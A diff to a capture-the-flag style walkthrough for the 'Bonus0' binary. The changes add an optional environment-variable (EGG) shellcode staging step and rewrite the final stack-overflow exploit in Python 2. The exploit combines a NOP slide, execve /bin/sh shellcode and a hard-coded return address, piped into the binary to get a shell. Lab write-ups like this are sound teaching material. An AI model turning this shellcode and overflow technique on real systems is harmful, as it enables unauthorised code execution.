@@ -1,4 +1,4 @@
-# Bonus0 - Complete Exploitation Walkthrough
+## Bonus0 - Complete Exploitation Walkthrough
 
 ## Binary Analysis
 ```bash
@@ -83,32 +83,42 @@ Result: buffer[42] overflow → return address overwrite
 - Provides large target area for return address
 - Shellcode placed at end of NOP slide
 
+### Optional: Place shellcode in environment (EGG)
+You can store a small NOP slide + shellcode in an environment variable and reference it as an alternate storage location. For example (Python 2 syntax):
+
+```bash
+export EGG=$(python -c "print '\x90' * 100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")
+```
+
+This places a 100-byte NOP slide followed by the 23-byte execve shellcode into the `EGG` environment variable. Some approaches use environment storage as an alternative to sending large NOP slides directly.
+
 ### Step 5: Calculate Return Address
 - Target: Middle of NOP slide = 0xbfffe640 + 100 = 0xbfffe6a4
 - Little endian format: `\xa4\xe6\xff\xbf`
 
 ## Final Exploit Construction
 
-### Input 1 (First " - " prompt):
-```python
-python -c "print('\x90' * 3000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')"
-```
-- Creates 3000-byte NOP slide + shellcode
-- strncpy() takes first 20 bytes (all NOPs)
-- No null termination occurs
+### Final Exploit Construction (use Python 2 as target runtime)
 
-### Input 2 (Second " - " prompt):
-```python
-python -c "print('B' * 14 + '\xa4\xe6\xff\xbf' + 'B')"
-```
-- 14 bytes padding to reach return address
-- Return address pointing to NOP slide  
-- Extra byte for alignment
+> Note: the environment-based `EGG` export (above) is optional. The working exploit below uses a large NOP slide sent directly to the binary. Use Python 2 (`python2`) to generate byte-accurate output.
 
-### Complete Exploit:
+### Input 1 (First " - " prompt): (generate large NOP slide + shellcode)
 ```bash
-(python -c "print('\x90' * 3000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')"; python -c "print('B' * 14 + '\xa4\xe6\xff\xbf' + 'B')"; cat) | ./bonus0
+python2 -c "print '\x90'*3000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'"
 ```
+
+### Input 2 (Second " - " prompt): (padding + return address)
+```bash
+python2 -c "print 'B'*14 + '\xa4\xe6\xff\xbf' + 'B'"
+```
+
+### Complete Exploit (one-liner using Python 2):
+```bash
+(python2 -c "print '\x90'*3000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'"; \
+ python2 -c "print 'B'*14 + '\xa4\xe6\xff\xbf' + 'B'"; cat) | ./bonus0
+```
+
+This exact pipeline uses `python2` for the correct print semantics (no automatic parentheses/encoding differences) and matches the exploit tested during analysis.
 
 ## Execution Result
 ```bash
